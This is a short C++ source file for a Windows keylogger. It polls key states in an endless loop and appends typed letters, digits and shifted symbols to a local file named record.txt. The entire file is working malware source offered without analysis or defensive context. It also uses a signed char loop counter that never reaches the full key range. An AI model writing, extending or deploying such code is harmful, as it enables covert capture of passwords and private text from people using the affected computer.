#include <iostream>
#include <windows.h> 
#include <Winuser.h> 
#include <fstream>    
using namespace std;

void keylog(){
	char key;
	while(true){
		for(key=0 ;key<=255; key++){
			if (GetAsyncKeyState(key) == -32767){
				ofstream write ("record.txt", ios::app);

				//...[+]Upper case.............................................................
				//shift(0x10), cap lock(0x14)
				if(((key>64) && (key<91)) && (GetAsyncKeyState(0x10))){
					write << key;
					write.close();
					break;
				}
				//...[+]Lower Case.............................................................
				else if (((key>64) && (key<91)) && !(GetAsyncKeyState(0x10))){
					key +=32;
					write << key;           
					write.close();
					break;
				}

				//...[+]Special Symbols.........................................................
				else{
					switch (key){
						case 48:{
							/*
							if(GetAsyncKeyState(0x10)){
								write << ")";
								break;
							}
								
							else{
								write << key;
								break;
							}
							*/
							(GetAsyncKeyState(0x10)?write << ")":write << key);
								break;	
						}
						case 49:{
								(GetAsyncKeyState(0x10)?write << "!":write << key);
								break;
							}
						case 50:{
								(GetAsyncKeyState(0x10)?write << "@":write << key);
								break;
						}
						case 51:{
								(GetAsyncKeyState(0x10)?write << "#":write << key);
								break;
						}
						case 52:{
								(GetAsyncKeyState(0x10)?write << "$":write << key);
								break;
						}
						case 53:{
								(GetAsyncKeyState(0x10)?write << "%":write << key);
								break;
						}
						case 54:{
								(GetAsyncKeyState(0x10)?write << "^":write << key);
								break;
						}
						case 55:{
								(GetAsyncKeyState(0x10)?write << "&":write << key);
								break;
						}
						case 56:{
								(GetAsyncKeyState(0x10)?write << "*":write << key);
								break;
						}
						case 57:{
								(GetAsyncKeyState(0x10)?write << "(":write << key);
								break;
						}
					}
				}					
			}
		}
	}
}

int main(){
	keylog();
	return 0;
}
